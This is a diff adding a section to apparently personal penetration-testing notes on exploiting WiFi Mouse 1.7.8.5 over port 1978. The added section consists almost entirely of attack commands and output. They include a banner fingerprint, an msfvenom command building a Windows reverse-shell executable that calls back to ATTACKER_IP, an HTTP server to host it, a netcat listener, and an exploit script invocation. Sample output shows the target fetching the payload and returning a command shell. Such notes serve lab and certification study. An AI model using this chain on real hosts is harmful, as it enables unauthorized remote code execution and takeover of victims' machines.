@@ -128,3 +128,49 @@ Check context immediately:
 whoami
 # nt authority\system
 ```
+
+## WiFi Mouse 1.7.8.5
+
+Port `1978` may also indicate WiFi Mouse rather than Remote Mouse. A useful banner indicator is:
+
+```text
+1978/tcp open  unisql?
+system windows 6.2
+luminateOK
+```
+
+Public reference:
+
+```text
+https://www.exploit-db.com/exploits/49601
+```
+
+Create a Windows reverse shell payload:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=8080 -f exe -o shell.exe
+```
+
+Host the payload on port `80` and start a listener:
+
+```bash
+python3 -m http.server 80
+nc -nlvp 8080
+```
+
+Run a Python 3 compatible WiFi Mouse exploit that accepts the target, attacker HTTP host, HTTP port, and payload name:
+
+```bash
+python3 exploit.py TARGET ATTACKER_IP 80 shell.exe
+```
+
+Successful indicators:
+
+```text
+[+] Retrieving payload
+[+] Done! Check Your Listener?
+GET /shell.exe HTTP/1.1
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
+Microsoft Windows [Version 10.0.15063]
+C:\Windows\system32>
+```
